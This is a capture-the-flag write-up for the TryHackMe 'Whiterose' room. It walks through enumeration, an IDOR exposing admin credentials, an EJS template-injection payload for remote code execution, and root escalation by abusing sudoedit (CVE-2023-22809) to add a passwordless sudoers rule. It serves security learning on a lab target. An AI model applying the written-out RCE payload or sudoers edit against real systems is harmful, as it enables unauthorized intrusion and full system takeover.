---
title: Whiterose Writeup | TryHackMe
date: 2024-11-18 19:21:00 +0500
image:
    path: "/assets/img/images/whiterose.webp"
    alt: Whiterose cover image
toc: true
comments: true
tags: linux tryhackme
categories: ["Capture The Flag"]
---

Welcome Reader, today we’ll hack Whiterose from [TryHackMe](https://tryhackme.com/r/room/whiterose). It is a free Mr. Robot-themed challenge created by [tryhackme](https://tryhackme.com/p/tryhackme) and [ngn](https://tryhackme.com/p/ngn).

## Enumeration

Starting with an Nmap scan.

```bash
~$ nmap 10.10.148.177 -sC -sV -A -oN Whiterose
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 09:15 EST
Nmap scan report for 10.10.148.177 (10.10.148.177)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```
{: .nolineno}

We have two ports open, SSH and HTTP.

### HTTP — 80

Going over to port 80 redirects to `cyprusbank.thm`. Let’s add it to the host file.

```
# Pentest Network
10.10.148.177 cyprusbank.thm
```

![homepage](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YzWU1cScR-3j4VRrcLd7gw.png)
_Cyprusbank_ 

Nothing interesting on the home page. Let’s do directory fuzzing to find hidden directories using [gobuster](https://www.kali.org/tools/gobuster/).

```bash
~$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://cyprusbank.thm/
===============================================================                
Gobuster v3.6                                                                                                                                                  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                  
===============================================================
[+] Url:                     http://cyprusbank.thm/            
[+] Method:                  GET                                                                                                                               
[+] Threads:                 10                                                
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
[+] Negative Status codes:   404                                               
[+] User Agent:              gobuster/3.6                      
[+] Timeout:                 10s                                               
===============================================================                                                                                                
Starting gobuster in directory enumeration mode                                                                                                                
===============================================================
/index.html           (Status: 200) [Size: 252]
/.                    (Status: 301) [Size: 194] [--> http://cyprusbank.thm/./]
Progress: 16244 / 16245 (99.99%)
===============================================================
Finished
===============================================================
```
{: .nolineno}

No hidden directories were found. Let’s do virtual host fuzzing using [ffuf](https://github.com/ffuf/ffuf).

```bash
~$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 233ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 294ms]
```
{: .nolineno }

The scan revealed two vhosts `www` and `admin`. Let’s add both of them to the host file.

```
# Pentest Network
10.10.148.177 cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
```
![Login Panel](https://miro.medium.com/v2/resize:fit:640/format:webp/1*iHACKyi3cvmC062NeOjR9A.png)
_Login Panel_

There is a login panel on admin vhost. The site uses [Express](https://expressjs.com/) web frameworks.

> Express.js, or simply Express, is a back-end web application framework for building RESTful APIs with Node.js, released as free and open-source software under the MIT License. [read more](https://en.wikipedia.org/wiki/Express.js)
{: .prompt-tip }

![Tech being used](https://miro.medium.com/v2/resize:fit:640/format:webp/1*U4LSYi6hIr6rEE5ik8HM_w.png)
_Tech beig used_

We can use the given credentials to login here. `Olivia Cortez:olivi8`
![Login Credentials](https://miro.medium.com/v2/resize:fit:720/format:webp/1*6KzpfCUBbLXFphymNia0XQ.png)
_Login Credentials_

After logging in I was enumerating the website and found something interesting.

![idor](https://miro.medium.com/v2/resize:fit:828/format:webp/1*MpCCVNx1FM06iXSSnYNzvg.png)
_Suspicious URL_

I tried rotating the number and found something interesting on `0`.

![IDOR](https://miro.medium.com/v2/resize:fit:828/format:webp/1*X2eV2_9MhNqDulQu_ueY5Q.png)
_IDOR_

> Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten.
{: .prompt-tip }

This is an [IDOR](https://portswigger.net/web-security/access-control/idor) vulnerability. I was able to access the admin chat by rotating the numbers. We can prevent such vulnerabilities by using cryptographic strong random values. [Read more](https://avatao.com/blog-best-practices-to-prevent-idor-vulnerabilities/) about how to prevent this.

Now we can use the admin credentials to log in.

![Tyrel Wellick](https://miro.medium.com/v2/resize:fit:828/format:webp/1*BE_3tU0RicgtgQTadSjjlw.png)
_What’s Tyrell Wellick’s phone number?_

## Initial Foothold

Now we can access the settings tab and change the passwords of users. Let’s try changing the password of `DEV TEAM`.

![Settings](https://miro.medium.com/v2/resize:fit:828/format:webp/1*O9zc80SGOu1r8lW8kr1eZQ.png)

### Server Side Template Injection

The password is reflected which tells me it could be `SSTI` because I tried `XSS` and had no luck. I tried to generate an error and it revealed ejs file extension.

> Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
{: .prompt-tip }

![error](https://miro.medium.com/v2/resize:fit:828/format:webp/1*BA7pEsmqLR0d8xj_L661NQ.png)
_[Embedded Javascript](https://www.geeksforgeeks.org/use-ejs-as-template-engine-in-node-js/)_

We can achieve Remote Code Execution by using the following attack from this [article](https://eslam.io/posts/ejs-server-side-template-injection-rce/).

```bash
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('your_command');s
```
{: .nolineno }

![rce](https://miro.medium.com/v2/resize:fit:828/format:webp/1*AWrxY-LQaFgNvwRWgSdo-A.png)
_Reverse Shell_

We can [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) our shell since Python3 is installed on the system. Reading the user flag.

```bash
web@cyprusbank:~$ cat user.txt 
THM{FLAGGED}
```
{: .nolineno }

## Privilege Escalation

While manually enumerating the system I found the web user can run sudoedit as root.

```bash
web@cyprusbank:~/.nvm/versions/node/v17.9.1/bin$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
{: .nolineno }

I found a way to modify files because the `sudoedit` version running on the system is vulnerable. [Read more](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis).

> A vulnerability was discovered by Synacktive in the sudo program and was published on January 18, 2023, known as CVE-2023-22809. This vulnerability leads to a security bypass in the sudoedit feature, allowing unauthorized users to escalate their privileges by editing files. This vulnerability affects versions of sudo from 1.8.0 through 1.9.12p1.
{: .prompt-tip }

```bash
web@cyprusbank:~/.nvm/versions/node/v17.9.1/bin$ sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```
{: .nolineno }

Exporting the `/etc/sudoers` file in the `PATH` variable to modify it.

```bash
web@cyprusbank:~$ export EDITOR="vi -- /etc/sudoers"
web@cyprusbank:~$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
{: .nolineno }

Now when we open the file it’ll open the sudoers file with write privileges and we’ll give web user privileges to run anything as root without a password.

```bash
web ALL=(ALL) NOPASSWD: ALL
```
{: .nolineno }

![sudoers](https://miro.medium.com/v2/resize:fit:828/format:webp/1*a4h5uzwswZrHFDLUVFiO0Q.png)
_Web --> Root_

Now save the files and check the web user sudo privileges.

```bash
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (ALL) NOPASSWD: ALL
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
{: .nolineno }

Getting a shell as root.

![root shell](https://miro.medium.com/v2/resize:fit:786/format:webp/1*ThQWa-_jkoLacdYNrbvU_w.png)
_Root Flag_

Thanks for reading, We successfully hacked **Whiterose** from TryHackMe.